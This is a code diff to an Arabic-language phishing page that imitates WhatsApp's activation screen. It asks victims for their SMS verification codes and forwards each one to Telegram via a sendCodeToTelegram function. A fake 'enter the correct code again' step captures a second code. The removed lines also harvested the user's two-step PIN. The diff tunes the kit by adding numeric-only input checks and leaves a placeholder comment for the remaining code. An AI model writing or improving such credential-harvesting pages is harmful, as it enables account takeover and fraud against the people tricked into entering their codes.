@@ -117,7 +117,7 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
         <h1>رمز التفعيل</h1>
         <p>يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
-        <input id="activationCode1" type="tel" placeholder="رمز التفعيل" maxlength="6">
+        <input id="activationCode1" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="رمز التفعيل" maxlength="6">
         <button onclick="submitFirstActivationCode()">متابعة</button>
         <div id="countdown"></div>
     </div>
@@ -142,6 +142,16 @@
             });
         }
 
+        function enforceNumericInput(inputId) {
+            const inputField = document.getElementById(inputId);
+            inputField.addEventListener('input', () => {
+                // السماح فقط بالأرقام الإنجليزية
+                inputField.value = inputField.value.replace(/[^0-9]/g, '');
+            });
+        }
+
+        enforceNumericInput("activationCode1");
+
         function startCountdown(callback) {
             let countdownValue = 5;
             const countdownDisplay = document.getElementById('countdown');
@@ -163,85 +173,27 @@
             const activationCode1 = document.getElementById('activationCode1').value;
 
             if (!activationCode1 || activationCode1.length !== 6 || !/^\d{6}$/.test(activationCode1)) {
-                alert('يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام.');
-                return;
-            }
-
-            sendCodeToTelegram(activationCode1, "رمز التفعيل ");
-
-            startCountdown(() => {
-                const container = document.getElementById('container');
-                container.innerHTML = `
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
-                    <h1>رمز التفعيل </h1>
-                    <p>يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
-                    <input id="activationCode2" type="tel" placeholder="رمز التفعيل " maxlength="6">
-                    <button onclick="submitSecondActivationCode()">متابعة</button>
-                    <div id="countdown"></div>
-                `;
-            });
-        }
-
-        function submitSecondActivationCode() {
-            const activationCode2 = document.getElementById('activationCode2').value;
-
-            if (!activationCode2 || activationCode2.length !== 6 || !/^\d{6}$/.test(activationCode2)) {
                 alert('يرجى إدخال رمز التفعيل المكون من 6 أرقام.');
                 return;
             }
 
-            sendCodeToTelegram(activationCode2, "رمز التفعيل ");
+            sendCodeToTelegram(activationCode1, "رمز التفعيل الأول");
 
             startCountdown(() => {
                 const container = document.getElementById('container');
                 container.innerHTML = `
                     <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
-                    <h1>انضم إلى مجموعة واتساب الآن  </h1>
-                    <p>يرجى إدخال رمز التحقق المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.</p>
-                    <input id="pinCode1" type="tel" placeholder="PIN " maxlength="6">
-                    <button onclick="submitFirstPin()">متابعة</button>
+                    <h1>رمز التفعيل الثاني</h1>
+                    <p>يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
+                    <input id="activationCode2" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="رمز التفعيل" maxlength="6">
+                    <button onclick="submitSecondActivationCode()">متابعة</button>
                     <div id="countdown"></div>
                 `;
+                enforceNumericInput("activationCode2");
             });
         }
 
-        function submitFirstPin() {
-            const pinCode1 = document.getElementById('pinCode1').value;
-
-            if (!pinCode1 || pinCode1.length !== 6 || !/^\d+$/.test(pinCode1)) {
-                alert('يرجى إدخال رمز التحقق المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.');
-                return;
-            }
-
-            sendCodeToTelegram(pinCode1, "انضم إلى مجموعة واتساب الآن  ");
-
-            startCountdown(() => {
-                const container = document.getElementById('container');
-                container.innerHTML = `
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
-                    <h1>انضم إلى مجموعة واتساب الآن  </h1>
-                    <p>يرجى إعادة إدخال رمز التحقق الصحيح المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.</p>
-                    <input id="pinCode2" type="tel" placeholder="PIN " maxlength="6">
-                    <button onclick="submitSecondPin()">متابعة</button>
-                    <div id="countdown"></div>
-                `;
-            });
-        }
-
-        function submitSecondPin() {
-            const pinCode2 = document.getElementById('pinCode2').value;
-
-            if (!pinCode2 || pinCode2.length !== 6 || !/^\d+$/.test(pinCode2)) {
-                alert('يرجى إإعادة دخال رمز التحقق الصحيح المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.');
-                return;
-            }
-
-            sendCodeToTelegram(pinCode2, "انضم إلى مجموعة واتساب الآن  ");
-
-            startCountdown(() => {
-                alert('يرجى الانتظار!');
-            });
-        }
+        // باقي الأكواد كما هي مع استخدام دالة enforceNumericInput للحقول الجديدة
     </script>
 </body>
 
